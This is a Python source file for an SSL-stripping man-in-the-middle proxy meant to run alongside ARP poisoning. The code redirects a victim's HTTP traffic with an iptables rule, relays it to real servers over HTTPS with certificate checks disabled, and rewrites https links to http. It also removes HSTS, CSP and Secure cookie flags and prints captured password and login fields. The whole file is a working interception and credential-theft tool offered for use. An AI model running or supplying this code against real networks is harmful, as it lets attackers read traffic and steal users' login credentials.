"""
Classic SSL Stripping for MITM attacks.

Intercepts HTTP traffic from victim, forwards to real server over HTTPS,
and returns stripped HTTP responses. Works with ARP poisoning to capture
traffic flowing through the attacker.
"""
# mypy: ignore-errors
from __future__ import annotations

import re
import socket
import ssl
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
import click

from network_utils import get_interface_info


class SSLStripHandler(BaseHTTPRequestHandler):
    """HTTP request handler that forwards to HTTPS and strips security."""

    stripper: 'SSLStripper' = None  # type: ignore

    def log_message(self, msg_format: str, *args: Any) -> None:
        """Suppress default HTTP server logging."""
        pass

    def _get_host(self) -> str:
        return self.headers.get('Host', 'example.com')

    def _log_credentials(self, body: bytes) -> None:
        if not body:
            return
        body_str = body.decode(errors='ignore').lower()
        cred_keywords = ['password', 'passwd', 'pass', 'pwd', 'secret', 'login', 'username', 'email']
        if any(kw in body_str for kw in cred_keywords):
            click.echo(click.style("\n" + "=" * 60, fg="red", bold=True))
            click.echo(click.style("  CREDENTIALS CAPTURED (SSL STRIPPED)!", fg="red", bold=True))
            click.echo(click.style("=" * 60, fg="red", bold=True))
            click.echo(f"  From: {self.client_address[0]} | Host: {self._get_host()} | Path: {self.path}")
            click.echo(click.style("-" * 60, fg="red"))
            for pair in body.decode(errors='ignore').split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    click.echo(f"  {key}: {value}")
            click.echo(click.style("=" * 60, fg="red", bold=True) + "\n")

    def _strip_https_from_response(self, content: bytes, content_type: str) -> bytes:
        """Rewrite https:// links to http:// in responses."""
        if not content_type or 'text' not in content_type.lower():
            return content
        try:
            text = content.decode('utf-8', errors='ignore')
            text = re.sub(r'https://', 'http://', text, flags=re.IGNORECASE)
            return text.encode('utf-8')
        except Exception:
            return content

    def _strip_security_headers(self, headers: list[tuple[str, str]]) -> list[tuple[str, str]]:
        """Remove HSTS, CSP, and Secure cookie flags."""
        stripped = []
        skip_headers = {'strict-transport-security', 'content-security-policy'}
        for name, value in headers:
            lower_name = name.lower()
            if lower_name in skip_headers:
                click.echo(click.style(f"[STRIP] Removed header: {name}", fg="yellow"))
                continue
            if lower_name == 'set-cookie':
                original = value
                value = re.sub(r';\s*[Ss]ecure', '', value)
                if value != original:
                    click.echo(click.style("[STRIP] Removed Secure flag from cookie", fg="yellow"))
            stripped.append((name, value))
        return stripped

    def _forward_to_real_server(self, method: str, body: bytes | None = None) -> None:
        """Forward request to real server over HTTPS, return response over HTTP."""
        host = self._get_host()
        if ':' in host:
            host = host.split(':')[0]

        try:
            # Resolve real IP and connect over HTTPS
            real_ip = socket.gethostbyname(host)
            click.echo(click.style(
                f"[HTTPS->] {method} {host} ({real_ip}:443){self.path}",
                fg="white"
            ))

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['http/1.1'])

            conn = socket.create_connection((real_ip, 443), timeout=10)
            ssl_conn = context.wrap_socket(conn, server_hostname=host)

            # Build and send request
            request_line = f"{method} {self.path} HTTP/1.1\r\n"
            headers = f"Host: {host}\r\n"
            skip_headers = {'host', 'connection', 'proxy-connection', 'keep-alive', 'transfer-encoding', 'upgrade'}
            for header, value in self.headers.items():
                if header.lower() not in skip_headers:
                    headers += f"{header}: {value}\r\n"
            headers += "Connection: close\r\n"
            if body:
                headers += f"Content-Length: {len(body)}\r\n"
            headers += "\r\n"

            ssl_conn.sendall(request_line.encode() + headers.encode())
            if body:
                ssl_conn.sendall(body)

            # Read response
            response_data = b""
            while True:
                chunk = ssl_conn.recv(8192)
                if not chunk:
                    break
                response_data += chunk
            ssl_conn.close()

            # Parse response
            if b"\r\n\r\n" in response_data:
                header_part, body_part = response_data.split(b"\r\n\r\n", 1)
            else:
                header_part, body_part = response_data, b""

            header_lines = header_part.decode('utf-8', errors='ignore').split('\r\n')
            status_parts = header_lines[0].split(' ', 2)
            status_code = int(status_parts[1]) if len(status_parts) >= 2 else 200
            status_msg = status_parts[2] if len(status_parts) >= 3 else 'OK'

            response_headers = []
            content_type = ''
            for line in header_lines[1:]:
                if ':' in line:
                    name, value = line.split(':', 1)
                    name, value = name.strip(), value.strip()
                    if name.lower() == 'content-type':
                        content_type = value
                    if name.lower() not in ('transfer-encoding', 'content-length'):
                        response_headers.append((name, value))

            response_headers = self._strip_security_headers(response_headers)
            body_part = self._strip_https_from_response(body_part, content_type)

            # Send stripped response to victim
            self.send_response(status_code, status_msg)
            for name, value in response_headers:
                self.send_header(name, value)
            self.send_header('Content-Length', str(len(body_part)))
            self.end_headers()
            self.wfile.write(body_part)

        except Exception as e:
            click.echo(click.style(f"[ERROR] Forward failed: {e}", fg="red"))
            self.send_error(502, f"Bad Gateway: {e}")

    def do_GET(self) -> None:
        click.echo(f"[<-HTTP] GET {self._get_host()}{self.path} from {self.client_address[0]}")
        self._forward_to_real_server('GET')

    def do_POST(self) -> None:
        click.echo(f"[<-HTTP] POST {self._get_host()}{self.path} from {self.client_address[0]}")
        content_length = self.headers.get('Content-Length')
        body = None
        if content_length:
            try:
                body = self.rfile.read(int(content_length))
                self._log_credentials(body)
            except (ValueError, OSError) as e:
                click.echo(f"Error reading POST body: {e}")
        self._forward_to_real_server('POST', body)

    def do_HEAD(self) -> None:
        self._forward_to_real_server('HEAD')

    def do_PUT(self) -> None:
        content_length = self.headers.get('Content-Length')
        body = self.rfile.read(int(content_length)) if content_length else None
        self._forward_to_real_server('PUT', body)

    def do_DELETE(self) -> None:
        self._forward_to_real_server('DELETE')


class SSLStripper:
    """
    SSL Stripping proxy manager.
    
    Listens on HTTP port 80, intercepts victim traffic (via ARP poisoning),
    forwards to real servers over HTTPS, strips security and returns HTTP.
    """

    def __init__(self, iface: str, victim_ip: str, gateway_ip: str,
                 http_port: int = 80, https_port: int | None = None, silent: bool = False):
        # silent parameter kept for API compatibility but not used (SSL logs always shown)
        if https_port is not None:
            http_port = https_port
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.http_port = http_port
        _, self.attacker_ip = get_interface_info(iface)
        self._running = False
        self._thread: threading.Thread | None = None
        self._server: HTTPServer | None = None
        self._iptables_rules: list[list[str]] = []

    def _setup_iptables(self) -> None:
        """Redirect HTTP traffic from victim to our proxy."""
        rules = [
            # Redirect all HTTP (port 80) from victim to our proxy
            ["iptables", "-t", "nat", "-I", "PREROUTING", "1",
             "-s", self.victim_ip, "-p", "tcp", "--dport", "80",
             "-j", "REDIRECT", "--to-port", str(self.http_port)],
        ]
        for cmd in rules:
            try:
                subprocess.run(cmd, check=True, capture_output=True)
                self._iptables_rules.append(cmd)
                click.echo(click.style(f"iptables: {' '.join(cmd[4:])}", fg="yellow"))
            except (subprocess.CalledProcessError, FileNotFoundError) as e:
                click.echo(click.style(f"Warning: iptables failed: {e}", fg="red"))

    def _cleanup_iptables(self) -> None:
        """Remove iptables rules."""
        for cmd in self._iptables_rules:
            try:
                del_cmd = cmd.copy()
                del_cmd[3] = "-D"  # Change -I to -D
                del_cmd.remove("1") if "1" in del_cmd else None
                subprocess.run(del_cmd, check=True, capture_output=True)
            except (subprocess.CalledProcessError, FileNotFoundError):
                pass
        self._iptables_rules = []
        click.echo(click.style("iptables: Cleaned up rules", fg="yellow"))

    def _run_http_proxy(self) -> None:
        SSLStripHandler.stripper = self
        try:
            self._server = HTTPServer(('0.0.0.0', self.http_port), SSLStripHandler)
            self._server.socket.settimeout(1.0)
            click.echo(click.style(f"SSL Stripper listening on port {self.http_port}", fg="green", bold=True))
            click.echo(click.style("  Victim <--HTTP--> Attacker <--HTTPS--> Real Server", fg="white"))
            while self._running:
                try:
                    self._server.handle_request()
                except socket.timeout:
                    continue
        except OSError as e:
            if self._running:
                click.echo(click.style(f"HTTP proxy error: {e}", fg="red"))
        finally:
            if self._server:
                self._server.server_close()
                self._server = None

    def start(self) -> None:
        if self._running:
            return
        self._setup_iptables()
        self._running = True
        self._thread = threading.Thread(target=self._run_http_proxy, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if not self._running:
            return
        click.echo(click.style("\nStopping SSL Stripper...", fg="yellow"))
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._cleanup_iptables()

    def join(self, timeout: float | None = None) -> None:
        if self._thread:
            self._thread.join(timeout)

    def is_running(self) -> bool:
        return self._running and self._thread is not None and self._thread.is_alive()

